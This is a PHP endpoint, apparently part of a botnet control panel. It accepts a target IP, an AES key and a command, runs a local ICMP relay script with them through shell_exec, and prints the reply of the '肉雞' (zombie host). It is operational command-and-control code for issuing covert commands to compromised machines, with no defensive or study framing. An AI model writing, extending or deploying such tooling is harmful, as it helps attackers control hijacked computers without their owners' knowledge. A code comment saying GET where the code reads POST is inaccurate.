<?php
header("Content-Type: text/plain; charset=utf-8");

// 必須是 GET 方式
if (!isset($_POST['ip']) || !isset($_POST['key']) || !isset($_POST['cmd'])) {
    die("缺少參數 ip / key / cmd");
}

$dst_ip  = $_POST['ip'];
$aes_key = $_POST['key'];
$cmd     = $_POST['cmd'];

// ★ 執行 ICMP 指令
$run = "php /www/wwwroot/rjpanel.qooqle.date/icmp_function.php "
     . escapeshellarg($dst_ip) . " "
     . escapeshellarg($cmd)    . " "
     . escapeshellarg($aes_key);

$output = shell_exec($run);

// 回傳給前端
echo "=== 肉雞 $dst_ip 回覆 ===\n";
echo $output;
